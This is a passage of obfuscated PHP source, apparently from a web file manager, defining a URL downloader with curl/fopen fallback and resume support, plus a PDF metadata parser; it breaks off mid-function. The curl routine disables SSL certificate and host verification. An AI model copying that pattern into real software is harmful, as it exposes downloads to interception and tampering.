<?php
 goto Bº¿¬ ğ–; A‡ÖàÀ åã: class Downloader { static function start($CçÑØ´†Ü, $e°¼ó¬Ë·ï, $AĞ‘”©ìíš = 10) { goto D±ŠÛÖë†•; FËòëª¬È: if (is_file($F×å„ã‘)) { $böëŸ§°î = file_get_contents($F×å„ã‘); $F—ŸŸ£ = json_decode($böëŸ§°î, 1); } if (file_exists($e°¼ó¬Ë·ï) && $F¹Ì¢äç£ == filesize($e°¼ó¬Ë·ï)) { @unlink($fíœßó“ªæ); @unlink($F×å„ã‘); return array($D÷ŠÑÕ ‰[1032] => !0, $D÷ŠÑÕ ‰[1034] => $D÷ŠÑÕ ‰[1520]); } if ($F—ŸŸ£[$D÷ŠÑÕ ‰[325]] != $F¹Ì¢äç£) { $F—ŸŸ£ = array($D÷ŠÑÕ ‰[325] => $F¹Ì¢äç£); } goto D²£Ù¤’ ¦; AÕ ª‹Ì“Û: if (!$CçÑØ´†Ü) { return array($D÷ŠÑÕ ‰[1032] => !1, $D÷ŠÑÕ ‰[1034] => $D÷ŠÑÕ ‰[1037]); } if (!$Dº³Ø±åğ[$D÷ŠÑÕ ‰[1290]] || $Dº³Ø±åğ[$D÷ŠÑÕ ‰[325]] == 0) { @unlink($fíœßó“ªæ); @unlink($e°¼ó¬Ë·ï); $Bº¢øì»ê  = self::fileDownloadFopen($CçÑØ´†Ü, $e°¼ó¬Ë·ï, $Dº³Ø±åğ[$D÷ŠÑÕ ‰[325]]); if ($Bº¢øì»ê [$D÷ŠÑÕ ‰[1032]]) { return $Bº¢øì»ê ; } else { @unlink($fíœßó“ªæ); @unlink($e°¼ó¬Ë·ï); $Bº¢øì»ê  = self::fileDownloadCurl($CçÑØ´†Ü, $e°¼ó¬Ë·ï, !1, 0, $Dº³Ø±åğ[$D÷ŠÑÕ ‰[325]]); @unlink($fíœßó“ªæ); return $Bº¢øì»ê ; } } $A´¼çå¶¥ = is_file($fíœßó“ªæ) ? filesize($fíœßó“ªæ) : 0; goto EÑ‘ßˆ’âÁ; EÑ‘ßˆ’âÁ: $F¹Ì¢äç£ = intval($Dº³Ø±åğ[$D÷ŠÑÕ ‰[325]]); if (file_exists($fíœßó“ªæ) && time() - filemtime($fíœßó“ªæ) < 3) { return array($D÷ŠÑÕ ‰[1032] => !1, $D÷ŠÑÕ ‰[1034] => $D÷ŠÑÕ ‰[1519]); } $F—ŸŸ£ = array(); goto FËòëª¬È; D²£Ù¤’ ¦: if ($A´¼çå¶¥ > $F¹Ì¢äç£) { @unlink($fíœßó“ªæ); } file_put_contents($F×å„ã‘, json_encode($F—ŸŸ£)); $Bº¢øì»ê  = self::fileDownloadCurl($CçÑØ´†Ü, $e°¼ó¬Ë·ï, !0, $A´¼çå¶¥, $F¹Ì¢äç£); goto Bâ‰‹—·Èš; D±ŠÛÖë†•: $D÷ŠÑÕ ‰ =& $_SERVER[”Ì÷ñ­î¸]; if (!request_url_safe($CçÑØ´†Ü)) { return array($D÷ŠÑÕ ‰[1032] => !1, $D÷ŠÑÕ ‰[1034] => $D÷ŠÑÕ ‰[1037]); } $F×å„ã‘ = $e°¼ó¬Ë·ï . $D÷ŠÑÕ ‰[1517]; goto C‹ŒÒÌİÕÄ; C‹ŒÒÌİÕÄ: $fíœßó“ªæ = $e°¼ó¬Ë·ï . $D÷ŠÑÕ ‰[1518]; if (is_array($CçÑØ´†Ü)) { $Dº³Ø±åğ = $CçÑØ´†Ü; } else { $Dº³Ø±åğ = url_header($CçÑØ´†Ü); } $CçÑØ´†Ü = $Dº³Ø±åğ[$D÷ŠÑÕ ‰[295]]; goto AÕ ª‹Ì“Û; Bâ‰‹—·Èš: if ($Bº¢øì»ê [$D÷ŠÑÕ ‰[1032]]) { @unlink($F×å„ã‘); } return $Bº¢øì»ê ; goto D°ğÅ­¿™¬; D°ğÅ­¿™¬: } static function fileDownloadFopen($Cˆöß„àØë, $A¸ÕÓù‘, $e‹Òñ†•¯ï = 0) { $dÖÒ­›ô·ò =& $_SERVER[”Ì÷ñ­î¸]; @ini_set($dÖÒ­›ô·ò[1521], $dÖÒ­›ô·ò[1522]); $cçõ½µòÔÓ = $A¸ÕÓù‘ . $dÖÒ­›ô·ò[1518]; set_timeout(); @unlink($cçõ½µòÔÓ); if ($d½çµñŠ›… = @fopen($Cˆöß„àØë, $dÖÒ­›ô·ò[1523])) { goto bÀæŠß¸é¦; DÚÓ‹Õõ‘: return array($dÖÒ­›ô·ò[1032] => !0, $dÖÒ­›ô·ò[1034] => $dÖÒ­›ô·ò[697]); goto DøÁ­ìİ¿Š; DÜÃ²à¸»: fclose($d½çµñŠ›…); self::checkGzip($cçõ½µòÔÓ); if (!@rename($cçõ½µòÔÓ, $A¸ÕÓù‘)) { usleep(round(rand(0, 1000) * 50)); @unlink($A¸ÕÓù‘); $b´±É¤ÑØ‹ = @rename($cçõ½µòÔÓ, $A¸ÕÓù‘); if (!$b´±É¤ÑØ‹) { return array($dÖÒ­›ô·ò[1032] => !1, $dÖÒ­›ô·ò[1034] => $dÖÒ­›ô·ò[1527]); } } goto DÚÓ‹Õõ‘; bÀæŠß¸é¦: if (!($D”öŠàœÑ = @fopen($cçõ½µòÔÓ, $dÖÒ­›ô·ò[1524]))) { return array($dÖÒ­›ô·ò[1032] => !1, $dÖÒ­›ô·ò[1034] => $dÖÒ­›ô·ò[1525]); } while (!feof($d½çµñŠ›…)) { if (!file_exists($cçõ½µòÔÓ)) { fclose($D”öŠàœÑ); return array($dÖÒ­›ô·ò[1032] => !1, $dÖÒ­›ô·ò[1034] => $dÖÒ­›ô·ò[1526]); } clearstatcache(); if ($e‹Òñ†•¯ï > 0 && $e‹Òñ†•¯ï == filesize(iconv_system($cçõ½µòÔÓ))) { break; } fwrite($D”öŠàœÑ, fread($d½çµñŠ›…, 1024 * 8), 1024 * 8); } fclose($D”öŠàœÑ); goto DÜÃ²à¸»; DøÁ­ìİ¿Š: } else { return array($dÖÒ­›ô·ò[1032] => !1, $dÖÒ­›ô·ò[1034] => $dÖÒ­›ô·ò[1528]); } } static function fileDownloadCurl($aÀ½áÜµ, $EÛšË„›Å·, $D—¿²ªÉÁê = false, $fÂ¥Ÿ¦À = 0, $a·Â‡¼£¡ğ = 0) { goto bòáçÕ¬¶Ë; EÓƒß—–ˆ¾: if ($D—¿²ªÉÁê) { curl_setopt($C®ï™ÙŞ÷, CURLOPT_RANGE, $fÂ¥Ÿ¦À . $CÏà‚‹ğ»ô[717]); } curl_setopt($C®ï™ÙŞ÷, CURLOPT_FILE, $aˆÂòíª»‡); curl_setopt($C®ï™ÙŞ÷, CURLOPT_REFERER, get_url_link($aÀ½áÜµ)); goto E‚„…¼®‹‰; f–ÌøˆâÉ: if ($Bˆ¶“°ãÓ < $a·Â‡¼£¡ğ && $a·Â‡¼£¡ğ != 0) { return array($CÏà‚‹ğ»ô[1032] => !1, $CÏà‚‹ğ»ô[1034] => $CÏà‚‹ğ»ô[1519]); } if ($cØÄĞƒÁì && filesize($aÔæËÓó) != 0) { self::checkGzip($aÔæËÓó); if (!@rename($aÔæËÓó, $EÛšË„›Å·)) { @unlink($EÛšË„›Å·); $cØÄĞƒÁì = @rename($aÔæËÓó, $EÛšË„›Å·); if (!$cØÄĞƒÁì) { return array($CÏà‚‹ğ»ô[1032] => !1, $CÏà‚‹ğ»ô[1034] => $CÏà‚‹ğ»ô[1531]); } } return array($CÏà‚‹ğ»ô[1032] => !0, $CÏà‚‹ğ»ô[1034] => $CÏà‚‹ğ»ô[697]); } return array($CÏà‚‹ğ»ô[1032] => !1, $CÏà‚‹ğ»ô[1034] => $CÏà‚‹ğ»ô[1532]); goto cÏÓÎÆÅ¶™; Eåó¥Á¿åÓ: curl_setopt($C®ï™ÙŞ÷, CURLOPT_NOPROGRESS, !1); curl_setopt($C®ï™ÙŞ÷, CURLOPT_PROGRESSFUNCTION, $CÏà‚‹ğ»ô[1530]); curl_progress_start($C®ï™ÙŞ÷); goto CÌóµëÓ¸â; BŠ¡¢”¥¼á: curl_close($C®ï™ÙŞ÷); fclose($aˆÂòíª»‡); $Bˆ¶“°ãÓ = filesize(iconv_system($aÔæËÓó)); goto f–ÌøˆâÉ; bë¼«š«Ãì: $aˆÂòíª»‡ = @fopen($aÔæËÓó, $CÏà‚‹ğ»ô[982]); if (!$aˆÂòíª»‡) { return array($CÏà‚‹ğ»ô[1032] => !1, $CÏà‚‹ğ»ô[1034] => $CÏà‚‹ğ»ô[1529]); } $C®ï™ÙŞ÷ = curl_init($aÀ½áÜµ); goto EÓƒß—–ˆ¾; CÌóµëÓ¸â: curl_setopt($C®ï™ÙŞ÷, CURLOPT_USERAGENT, $CÏà‚‹ğ»ô[1522]); $cØÄĞƒÁì = curl_exec($C®ï™ÙŞ÷); curl_progress_end($C®ï™ÙŞ÷); goto BŠ¡¢”¥¼á; E‚„…¼®‹‰: curl_setopt($C®ï™ÙŞ÷, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($C®ï™ÙŞ÷, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($C®ï™ÙŞ÷, CURLOPT_SSL_VERIFYHOST, 0); goto Eåó¥Á¿åÓ; bòáçÕ¬¶Ë: $CÏà‚‹ğ»ô =& $_SERVER[”Ì÷ñ­î¸]; $aÔæËÓó = $EÛšË„›Å· . $CÏà‚‹ğ»ô[1518]; set_timeout(); goto bë¼«š«Ãì; cÏÓÎÆÅ¶™: } static function checkGzip($aîô²ŞÒÄ¹) { goto cùÜÍŞê™; cùÜÍŞê™: $F™Ù…Ê“ÙÕ = $_SERVER[”Ì÷ñ­î¸][1533]; $eˆã¦ƒá» = file_sub_str($aîô²ŞÒÄ¹, 0, 2); if ($F™Ù…Ê“ÙÕ != $eˆã¦ƒá») { return; } goto F¹Ã®©„½Ü; cãğŒ›²Ã: file_put_contents($aîô²ŞÒÄ¹, $c²‘†ÅØ“¤); goto b¿¬Ñ¹½; F¹Ã®©„½Ü: ob_start(); readgzfile($aîô²ŞÒÄ¹); $c²‘†ÅØ“¤ = ob_get_clean(); goto cãğŒ›²Ã; b¿¬Ñ¹½: } } class FileParsePdf { public static function parse($A©ÎÂÛšƒ) { goto BÇÉˆßö…; Dˆù†”†«‰: preg_match($FÍ±öÛ‘‚í, $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1536]], $C­¢——œè¦); if (!$c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1538]] && count($C­¢——œè¦) == 5) { $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1538]] = $C­¢——œè¦[3]; $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1540]] = $C­¢——œè¦[4]; } preg_match($D¦ÅÂº…Ò‰[1541], $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1535]], $C­¢——œè¦); goto bÏ††µ–À¶; Bøˆ‘Ë§‹: if ($C­¢——œè¦[1] && $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1542]] < $C­¢——œè¦[1][0]) { $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1542]] = $C­¢——œè¦[1][0]; } $c¯ç¡‰¡Ì = self::parseInfoItem($c¯ç¡‰¡Ì); return $c¯ç¡‰¡Ì; goto dÓÄİ½Ü£©; bÏ††µ–À¶: if ($C­¢——œè¦) { $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1343]] = $C­¢——œè¦[1]; } $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1542]] = 0; $FÍ±öÛ‘‚í = $D¦ÅÂº…Ò‰[1543]; goto E¥ƒ®‰î¾ù; BÇÉˆßö…: $D¦ÅÂº…Ò‰ =& $_SERVER[”Ì÷ñ­î¸]; $c…­ÖøÄ‹  = 32 * 1024; $DÂ†´Şè¸² = array($D¦ÅÂº…Ò‰[777] => fopen($A©ÎÂÛšƒ, $D¦ÅÂº…Ò‰[1172]), $D¦ÅÂº…Ò‰[75] => $A©ÎÂÛšƒ, $D¦ÅÂº…Ò‰[77] => filesize($A©ÎÂÛšƒ), $D¦ÅÂº…Ò‰[1534] => $c…­ÖøÄ‹ ); goto CÆ¥Éã³Ë—; aç–ã½§È¸: if ($aì‡á‡ß–Ò) { $aíÜ‘óÒ×Æ = $aì‡á‡ß–Ò[$D¦ÅÂº…Ò‰[1537]][$D¦ÅÂº…Ò‰[1194]]; $c¯ç¡‰¡Ì = self::getObjectValue($DÂ†´Şè¸², $aì‡á‡ß–Ò, $aíÜ‘óÒ×Æ); } $c¯ç¡‰¡Ì = is_array($c¯ç¡‰¡Ì) ? $c¯ç¡‰¡Ì : array(); $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1538]] = 0; goto BÚ¬á“ÊÎ; BÚ¬á“ÊÎ: $FÍ±öÛ‘‚í = $D¦ÅÂº…Ò‰[1539]; preg_match($FÍ±öÛ‘‚í, $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1535]], $C­¢——œè¦); if (!$c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1538]] && count($C­¢——œè¦) == 5) { $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1538]] = $C­¢——œè¦[3]; $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1540]] = $C­¢——œè¦[4]; } goto Dˆù†”†«‰; CÆ¥Éã³Ë—: $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1535]] = StreamWrapperIO::read($A©ÎÂÛšƒ, 0, $c…­ÖøÄ‹ ); $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1536]] = StreamWrapperIO::read($A©ÎÂÛšƒ, $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[77]] - $c…­ÖøÄ‹ , $c…­ÖøÄ‹ ); $aì‡á‡ß–Ò = self::decodeXref($DÂ†´Şè¸²); goto aç–ã½§È¸; E¥ƒ®‰î¾ù: preg_match_all($FÍ±öÛ‘‚í, $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1535]], $C­¢——œè¦); if ($C­¢——œè¦[1] && $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1542]] < $C­¢——œè¦[1][0]) { $c¯ç¡‰¡Ì[$D¦ÅÂº…Ò‰[1542]] = $C­¢——œè¦[1][0]; } preg_match_all($FÍ±öÛ‘‚í, $DÂ†´Şè¸²[$D¦ÅÂº…Ò‰[1536]], $C­¢——œè¦); goto Bøˆ‘Ë§‹; dÓÄİ½Ü£©: } private static function parseInfoItem($AìÀ¶ƒ­¨³) { $B÷–í·‘¬ =& $_SERVER[”Ì÷ñ­î¸]; if (!$AìÀ¶ƒ­¨³) { return !1; } $aó‡¨‰“™ = array($B÷–í·‘¬[1344] => array($B÷–í·‘¬[1544], $B÷–í·‘¬[33]), $B÷–í·‘¬[1545] => array($B÷–í·‘¬[1546], $B÷–í·‘¬[33]), $B÷–í·‘¬[187] => array($B÷–í·‘¬[1547], $B÷–í·‘¬[210]), $B÷–í·‘¬[107] => array($B÷–í·‘¬[1548], $B÷–í·‘¬[210]), $B÷–í·‘¬[1542] => array($B÷–í·‘¬[1542], $B÷–í·‘¬[276]), $B÷–í·‘¬[1538] => array($B÷–í·‘¬[1538], $B÷–í·‘¬[276]), $B÷–í·‘¬[1540] => array($B÷–í·‘¬[1540], $B÷–í·‘¬[276]), $B÷–í·‘¬[1549] => array($B÷–í·‘¬[1550], $B÷–í·‘¬[33]), $B÷–í·‘¬[1551] => array($B÷–í·‘¬[1552], $B÷–í·‘¬[33]), $B÷–í·‘¬[1553] => array($B÷–í·‘¬[1343], $B÷–í·‘¬[33])); $fŞ½øÏøî = array(); foreach ($aó‡¨‰“™ as $CÇÓÄ°•£ => $bõŒÒïÙ˜¨) { if (!isset($AìÀ¶ƒ­¨³[$bõŒÒïÙ˜¨[0]])) { continue; } $aöĞÃ§ºã = $AìÀ¶ƒ­¨³[$bõŒÒïÙ˜¨[0]]; if (!$aöĞÃ§ºã || is_array($aöĞÃ§ºã)) { continue; } switch ($bõŒÒïÙ˜¨[1]) { case $B÷–í·‘¬[276]: $aöĞÃ§ºã = intval($aöĞÃ§ºã); break; case $B÷–í·‘¬[210]: if (substr($aöĞÃ§ºã, 0, 2) == $B÷–í·‘¬[1554]) { $aöĞÃ§ºã = substr($aöĞÃ§ºã, 2, 14); } if (strtotime($aöĞÃ§ºã)) { $aöĞÃ§ºã = date($B÷–í·‘¬[1555], strtotime($aöĞÃ§ºã)); } break; } $fŞ½øÏøî[$CÇÓÄ°•£] = $aöĞÃ§ºã; } return $fŞ½øÏøî; } private static function decodeXref(&$aÊìÒàòºĞ) { goto d”¤ğŞó×; aÂ’¹Š¼å: if (preg_match($b‹¥±¡¬é[1563], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[77]] = intval($e‹œôØÇÍ¸[1]); } if (preg_match($b‹¥±¡¬é[1564], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[1565]] = intval($e‹œôØÇÍ¸[1]) . $b‹¥±¡¬é[70] . intval($e‹œôØÇÍ¸[2]); } if (preg_match($b‹¥±¡¬é[1566], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[1567]] = intval($e‹œôØÇÍ¸[1]) . $b‹¥±¡¬é[70] . intval($e‹œôØÇÍ¸[2]); } goto d÷â¨å¾‚¢; eøÔß¯°•É: if (preg_match($b‹¥±¡¬é[1570], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { } return $d²óá³•ëÅ; goto FŠ—öìëã; dÛìÈµù: $cñãµæ¸Ş® = $b‹¥±¡¬é[1557]; if (!preg_match_all($cñãµæ¸Ş®, $Cùöˆ’İ±, $e‹œôØÇÍ¸, PREG_SET_ORDER, 0)) { return !1; } $eµöĞÁ—³ù = intval($e‹œôØÇÍ¸[0][1]); goto eæùŒ•Í ¢; d÷â¨å¾‚¢: if (preg_match($b‹¥±¡¬é[1568], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[1194]] = intval($e‹œôØÇÍ¸[1]) . $b‹¥±¡¬é[70] . intval($e‹œôØÇÍ¸[2]); } if (preg_match($b‹¥±¡¬é[1569], $Eöİ¾êøñÛ, $e‹œôØÇÍ¸) > 0) { $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[367]] = array(); $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[367]][0] = $e‹œôØÇÍ¸[1]; $d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[367]][1] = $e‹œôØÇÍ¸[2]; } if (!$d²óá³•ëÅ[$b‹¥±¡¬é[1537]][$b‹¥±¡¬é[1194]]) { return !1; } goto eøÔß¯°•É; d”¤ğŞó×: $b‹¥±¡¬é =& $_SERVER[”Ì÷ñ­î¸]; $Cùöˆ’İ± = $aÊìÒàòºĞ[$b‹¥±¡¬é[1536]]; $d²óá³•ëÅ = array($b‹¥±¡¬é[1537] => array(), $b‹¥±¡¬é[1556] => array()); goto dÛìÈµù; eæùŒ•Í ¢: if ($aÊìÒàòºĞ[$b‹¥±¡¬é[77]] - $eµöĞÁ—³ù > $aÊìÒàòºĞ[$b‹¥±¡¬é[1534]]) { $bÁïÄÒª§Ÿ = 4 * $aÊìÒàòºĞ[$b‹¥±¡¬é[1534]]; $aÊìÒàòºĞ[$b‹¥±¡¬é[1534]] = $bÁïÄÒª§Ÿ; $aÊìÒàòºĞ[$b‹¥±¡¬é[1535]] = StreamWrapperIO::read($aÊìÒàòºĞ[$b‹¥±¡¬é[75]], 0, $bÁïÄÒª§Ÿ); $aÊìÒàòºĞ[$b‹¥±¡¬é[1536]] = StreamWrapperIO::read($aÊìÒàòºĞ[$b‹¥±¡¬é[75]], $aÊìÒàòºĞ[$b‹¥±¡¬é[77]] - $bÁïÄÒª§Ÿ, $bÁïÄÒª§Ÿ); $Cùöˆ’İ± = $aÊìÒàòºĞ[$b‹¥±¡¬é[1536]]; } $D•îÅŸÀÇ = 0; preg_match_all($b‹¥±¡¬é[1558], $Cùöˆ’İ±, $e‹œôØÇÍ¸); goto e†˜àÚ‡Ä; e†˜àÚ‡Ä: foreach ($e‹œôØÇÍ¸[3] as $E¿²åŸ”²ñ => $FõÀôºÎò‹) { if ($e‹œôØÇÍ¸[3][$E¿²åŸ”²ñ] == $b‹¥±¡¬é[1559]) { $a¯éåòè¼¡ = $D•îÅŸÀÇ . $b‹¥±¡¬é[70] . intval($e‹œôØÇÍ¸[2][$E¿²åŸ”²ñ]); $d²óá³•ëÅ[$b‹¥±¡¬é[1556]][$a¯éåòè¼¡] = intval($e‹œôØÇÍ¸[1][$E¿²åŸ”²ñ]); ++$D•îÅŸÀÇ; } else { if ($e‹œôØÇÍ¸[3][$E¿²åŸ”²ñ] == $b‹¥±¡¬é[1560]) { ++$D•îÅŸÀÇ; } else { } } } if (preg_match_all($b‹¥±¡¬é[1561], $Cùöˆ’İ±, $e‹œôØÇÍ¸)) { $C†ß˜ê½õ¤ = $aÊìÒàòºĞ[$b‹¥±¡¬é[77]] - $aÊìÒàòºĞ[$b‹¥±¡¬é[1534]]; foreach ($e‹œôØÇÍ¸[0] as $E¿²åŸ”²ñ => $AÓÑŸ›¨Œ”) { $D™ÀÄ¯ßæ = $e‹œôØÇÍ¸[1][$E¿²åŸ”²ñ] . $b‹¥±¡¬é[70] . $e‹œôØÇÍ¸[2][$E¿²åŸ”²ñ]; $d²óá³•ëÅ[$b‹¥±¡¬é[1556]][$D™ÀÄ¯ßæ] = strpos($Cùöˆ’İ±, $AÓÑŸ›¨Œ”) + $C†ß˜ê½õ¤ + 1; } } if (preg_match_all($b‹¥±¡¬é[1562], $Cùöˆ’İ±, $e‹œôØÇÍ¸)) { $Eöİ¾êøñÛ = count($e‹œôØÇÍ¸[1]) == 1 ? $e‹œôØÇÍ¸[1][0] : $e‹œôØÇÍ¸[1][1]; } else { $Eöİ¾êøñÛ = substr($Cùöˆ’İ±, -1024 * 5); } goto aÂ’¹Š¼å; FŠ—öìëã: } private static function getObjectValue($fë›óÍİš­, $B´²¸©òÂÍ, $f™æ‚‘±œÎ) { goto fÇ†ç¨÷«ƒ; c‰Éƒ¼‰øá: if (!is_array($FŞ„Ï¬Œè[1])) { return array(); } $EçÖ×ŠÄ = array(); for ($aÌ±½çÓÇ = 0; $aÌ±½çÓÇ < count($FŞ„Ï¬Œè[1]); $aÌ±½çÓÇ += 2) { $fğáÎ‡„¼ = $FŞ„Ï¬Œè[1][$aÌ±½çÓÇ]; $D‹ñÙ£³á¡ = $FŞ„Ï¬Œè[1][$aÌ±½çÓÇ + 1]; if (count($fğáÎ‡„¼) == 3 && $fğáÎ‡„¼[0] == $b¨™Ÿğİé†[8]) { $c¡®°¹ª„Ö = !1; if ($D‹ñÙ£³á¡[0] == $b¨™Ÿğİé†[1571]) { $D‹ñÙ£³á¡ = self::getObject($fë›óÍİš­, $B´²¸©òÂÍ[$b¨™Ÿğİé†[1556]][$D‹ñÙ£³á¡[1]]); } $c¡®°¹ª„Ö = $D‹ñÙ£³á¡[1]; if ($c¡®°¹ª„Ö === !1) { continue; } if (is_string($c¡®°¹ª„Ö)) { $c¡®°¹ª„Ö = self::decodeStr($c¡®°¹ª„Ö); } $EçÖ×ŠÄ[$fğáÎ‡„¼[1]] = $c¡®°¹ª„Ö; } } goto e–œ‘ç¿¾Ş; fÇ†ç¨÷«ƒ: $b¨™Ÿğİé† =& $_SERVER[”Ì÷ñ­î¸]; $FŞ„Ï¬Œè = self::getObject($fë›óÍİš­, $B´²¸©òÂÍ[$b¨™Ÿğİé†[1556]][$f™æ‚‘±œÎ]); if (is_string($FŞ„Ï¬Œè[1])) { return $FŞ„Ï¬Œè[1]; } goto c‰Éƒ¼‰øá; e–œ‘ç¿¾Ş: return $EçÖ×ŠÄ; goto cÖ˜ó»Æ‘; cÖ˜ó»Æ‘: } private static function getObject($fáÍÖºØ½, $fÌ´ØÑ™¬õ) { $A²éÃÈîÇÀ = self::getObjectItem($fáÍÖºØ½, $fÌ´ØÑ™¬õ); $A²éÃÈîÇÀ = self::getObjectItem($fáÍÖºØ½, $A²éÃÈîÇÀ[2]); return $A²éÃÈîÇÀ; } private static function getObjectItem($Bá ‘›âÃ®, $B‘â¢‚˜•©) { goto F„ëä…í±; b¢øÙË—ƒ: $cŒİ§•ãğõ = $B‘â¢‚˜•© >= $aÏƒ÷Ü¡‡µ ? $B‘â¢‚˜•© - $aÏƒ÷Ü¡‡µ : $B‘â¢‚˜•©; $a’£ÃÏ¤Ÿ = $B‘â¢‚˜•© >= $aÏƒ÷Ü¡‡µ ? $Bá ‘›âÃ®[$f¦ó÷ÓçĞÛ[1536]] : $Bá ‘›âÃ®[$f¦ó÷ÓçĞÛ[1535]]; if ($B‘â¢‚˜•© > $d…Òˆ“Õññ && $B‘â¢‚˜•© <= $aÏƒ÷Ü¡‡µ) { $cŒİ§•ãğõ = 0; $a’£ÃÏ¤Ÿ = StreamWrapperIO::read($Bá ‘›âÃ®[$f¦ó÷ÓçĞÛ[75]], $B‘â¢‚˜•©, $d…Òˆ“Õññ); } goto f‰ìùê‡Íã; f‰ìùê‡Íã: $e–ì˜“¿Á = self::getRawObject($a’£ÃÏ¤Ÿ, $cŒİ§•ãğõ); if ($B‘â¢‚˜•© >= $aÏƒ÷Ü¡‡µ) { $e–ì˜“¿Á[2] = $e–ì˜“¿Á[2] + $aÏƒ÷Ü¡‡µ; } else { if ($B‘â¢‚˜•© > $d…Òˆ“Õññ && $B‘â¢‚˜•© <= $aÏƒ÷Ü¡‡µ) { $e–ì˜“¿Á[2] = $e–ì˜“¿Á[2] + $B‘â¢‚˜•©; } } return $e–ì˜“¿Á; goto EëĞøÔ“„; F„ëä…í±: $f¦ó÷ÓçĞÛ =& $_SERVER[”Ì÷ñ­î¸]; $d…Òˆ“Õññ = $Bá ‘›âÃ®[$f¦ó÷ÓçĞÛ[1534]]; $aÏƒ÷Ü¡‡µ = $Bá ‘›âÃ®[$f¦ó÷ÓçĞÛ[77]] - $d…Òˆ“Õññ; goto b¢øÙË—ƒ; EëĞøÔ“„: } private static function decodeStr($aì¾ô™è‡Ÿ) { goto bˆÑìœĞÕí; f£¼á©ƒ«Š: return $aì¾ô™è‡Ÿ; goto fĞŒŒ÷ºÏ™; bˆÑìœĞÕí: $c„µ¯Ç¦Ğ¥ =& $_SERVER[”Ì÷ñ­î¸]; $aì¾ô™è‡Ÿ = str_replace(array($c„µ¯Ç¦Ğ¥[1572], $c„µ¯Ç¦Ğ¥[1573], $c„µ¯Ç¦Ğ¥[1574], $c„µ¯Ç¦Ğ¥[1575], $c„µ¯Ç¦Ğ¥[1576], $c„µ¯Ç¦Ğ¥[1577], $c„µ¯Ç¦Ğ¥[1578], $c„µ¯Ç¦Ğ¥[1579]), array($c„µ¯Ç¦Ğ¥[93], $c„µ¯Ç¦Ğ¥[50], $c„µ¯Ç¦Ğ¥[8], $c„µ¯Ç¦Ğ¥[248], $c„µ¯Ç¦Ğ¥[819], $c„µ¯Ç¦Ğ¥[217], $c„µ¯Ç¦Ğ¥[992], $c„µ¯Ç¦Ğ¥[330]), $aì¾ô™è‡Ÿ); $cÇ¨¬ßÕ¦Ş = preg_split($c„µ¯Ç¦Ğ¥[1580], $aì¾ô™è‡Ÿ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E˜„„”×ËÑ; E˜„„”×ËÑ: $aì¾ô™è‡Ÿ = $c„µ¯Ç¦Ğ¥[33]; foreach ($cÇ¨¬ßÕ¦Ş as $eéô§ªéĞ”) { if (preg_match($c„µ¯Ç¦Ğ¥[1581], $eéô§ªéĞ”)) { $aì¾ô™è‡Ÿ .= \chr(octdec(trim($eéô§ªéĞ”, $c„µ¯Ç¦Ğ¥[93]))); } else { $aì¾ô™è‡Ÿ .= $eéô§ªéĞ”; } } $cÇ¨¬ßÕ¦Ş = preg_split($c„µ¯Ç¦Ğ¥[1582], $aì¾ô™è‡Ÿ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C®©êÇ…±…; aËéô˜Û›ó: $aì¾ô™è‡Ÿ = $c„µ¯Ç¦Ğ¥[33]; foreach ($cÇ¨¬ßÕ¦Ş as $eéô§ªéĞ”) { if (preg_match($c„µ¯Ç¦Ğ¥[1586], $eéô§ªéĞ”) && !1 === stripos($eéô§ªéĞ”, $c„µ¯Ç¦Ğ¥[1587])) { $eéô§ªéĞ” = preg_replace($c„µ¯Ç¦Ğ¥[1588], $c„µ¯Ç¦Ğ¥[33], $eéô§ªéĞ”); $eéô§ªéĞ” = trim($eéô§ªéĞ”, $c„µ¯Ç¦Ğ¥[928]); $eéô§ªéĞ” = pack($c„µ¯Ç¦Ğ¥[1589], $eéô§ªéĞ”); $aì¾ô™è‡Ÿ .= $eéô§ªéĞ”; } else { $aì¾ô™è‡Ÿ .= $eéô§ªéĞ”; } } if (preg_match($c„µ¯Ç¦Ğ¥[1590], $aì¾ô™è‡Ÿ)) { $C¿‡·£œÖ„ = substr($aì¾ô™è‡Ÿ, 2); $aì¾ô™è‡Ÿ = $c„µ¯Ç¦Ğ¥[33]; $aÈĞ½ŠÙáº = strlen($C¿‡·£œÖ„); for ($f‘Ò›•‚‚ = 0; $f‘Ò›•‚‚ < 